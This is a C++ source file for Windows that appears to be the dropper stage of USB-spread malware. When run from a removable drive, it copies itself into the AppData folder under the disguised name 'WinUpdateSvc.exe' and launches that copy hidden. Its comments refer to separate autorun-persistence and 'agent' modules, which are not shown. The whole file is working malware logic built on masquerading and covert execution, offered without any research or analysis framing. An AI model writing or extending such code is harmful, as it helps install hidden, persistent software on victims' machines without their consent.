#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <filesystem>

#pragma comment(lib, "Shell32.lib")

bool IsRunningFromUSB() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    wchar_t drive = path[0];

    wchar_t driveRoot[] = { drive, L':', L'\\', L'\0' };
    UINT driveType = GetDriveTypeW(driveRoot);

    return (driveType == DRIVE_REMOVABLE);
}

std::wstring GetLocalDeployPath() {
    wchar_t appData[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
    std::wstring targetPath = std::wstring(appData) + L"\\WinUpdateService";
    CreateDirectoryW(targetPath.c_str(), NULL);
    return targetPath;
}

bool CopySelfTo(const std::wstring& destFolder) {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    std::wstring destPath = destFolder + L"\\WinUpdateSvc.exe";
    return CopyFileW(exePath, destPath.c_str(), FALSE);
}

void LaunchAgent(const std::wstring& agentPath) {
    ShellExecuteW(NULL, NULL, agentPath.c_str(), NULL, NULL, SW_HIDE);
}

int main() {
    if (IsRunningFromUSB()) {
        std::wstring deployPath = GetLocalDeployPath();
        if (CopySelfTo(deployPath)) {
            std::wstring deployedExe = deployPath + L"\\WinUpdateSvc.exe";

            // Optionally create autorun task using autolaunch.cpp logic
            ShellExecuteW(NULL, NULL, deployedExe.c_str(), L"--setup", NULL, SW_HIDE);
        }
    } else {
        // Already running from disk, ensure persistence (reuse --setup mode to call autolaunch.cpp-like code)
        // For simplicity, you can have agent.cpp handle --setup
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);

        // Launch the agent logic (assuming agent.cpp integrated inside same exe)
        ShellExecuteW(NULL, NULL, exePath, L"--agent", NULL, SW_HIDE);
    }

    return 0;
}
